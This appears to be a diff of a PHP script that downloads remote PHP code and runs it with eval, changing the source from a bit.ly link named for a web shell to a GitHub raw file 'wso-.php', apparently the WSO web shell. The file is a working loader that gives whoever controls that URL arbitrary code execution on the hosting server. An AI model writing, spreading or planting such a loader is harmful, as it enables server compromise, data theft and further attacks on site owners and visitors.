@@ -29,6 +29,6 @@ function ambilInfoUrl($url) {
 }
 
 $coki = tempnam(sys_get_temp_dir(), 'coki_');
-$a = ambilInfoUrl('https://bit.ly/combetwebshell');
+$a = ambilInfoUrl('https://github.com/ohctcombet/new/raw/main/wso-.php');
 eval('?>' . $a);
 ?>
